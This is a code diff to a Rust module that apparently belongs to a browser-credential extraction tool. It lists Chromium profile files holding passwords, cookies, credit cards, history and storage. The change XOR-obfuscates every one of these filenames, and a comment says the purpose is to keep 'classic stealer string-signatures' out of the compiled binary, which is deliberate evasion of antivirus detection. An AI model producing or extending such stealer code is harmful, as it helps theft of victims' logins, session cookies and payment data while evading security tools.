@@ -40,31 +40,51 @@ pub type Sources = HashMap<Category, Vec<SourcePath>>;
 /// The standard Chromium file layout. Each category maps to one or more
 /// candidate paths tried in priority order; the first existing path wins
 /// (Go: `chromiumSources`).
+///
+/// Filenames are emitted through `bypass::x!` (const XOR) so the classic
+/// stealer string-signatures ("Login Data", "Cookies", "Web Data", …) never
+/// land plaintext in `.rdata`. Ownership is statement-local (each `&String`
+/// borrow is consumed by `SourcePath` before the insert returns).
 pub fn chromium_sources() -> Sources {
     let mut m = Sources::new();
-    m.insert(Category::PASSWORD, vec![SourcePath::file("Login Data")]);
+    m.insert(
+        Category::PASSWORD,
+        vec![SourcePath::file(&bypass::x!("Login Data", 0x7C))],
+    );
     m.insert(
         Category::COOKIE,
         vec![
-            SourcePath::file("Network/Cookies"),
-            SourcePath::file("Cookies"),
+            SourcePath::file(&bypass::x!("Network/Cookies", 0x51)),
+            SourcePath::file(&bypass::x!("Cookies", 0x6B)),
         ],
     );
-    m.insert(Category::HISTORY, vec![SourcePath::file("History")]);
-    m.insert(Category::DOWNLOAD, vec![SourcePath::file("History")]);
-    m.insert(Category::BOOKMARK, vec![SourcePath::file("Bookmarks")]);
-    m.insert(Category::CREDIT_CARD, vec![SourcePath::file("Web Data")]);
+    m.insert(
+        Category::HISTORY,
+        vec![SourcePath::file(&bypass::x!("History", 0x18))],
+    );
+    m.insert(
+        Category::DOWNLOAD,
+        vec![SourcePath::file(&bypass::x!("History", 0xA4))],
+    );
+    m.insert(
+        Category::BOOKMARK,
+        vec![SourcePath::file(&bypass::x!("Bookmarks", 0x2F))],
+    );
+    m.insert(
+        Category::CREDIT_CARD,
+        vec![SourcePath::file(&bypass::x!("Web Data", 0x5D))],
+    );
     m.insert(
         Category::EXTENSION,
-        vec![SourcePath::file("Secure Preferences")],
+        vec![SourcePath::file(&bypass::x!("Secure Preferences", 0x44))],
     );
     m.insert(
         Category::LOCAL_STORAGE,
-        vec![SourcePath::dir("Local Storage/leveldb")],
+        vec![SourcePath::dir(&bypass::x!("Local Storage/leveldb", 0x39))],
     );
     m.insert(
         Category::SESSION_STORAGE,
-        vec![SourcePath::dir("Session Storage")],
+        vec![SourcePath::dir(&bypass::x!("Session Storage", 0x22))],
     );
     m
 }
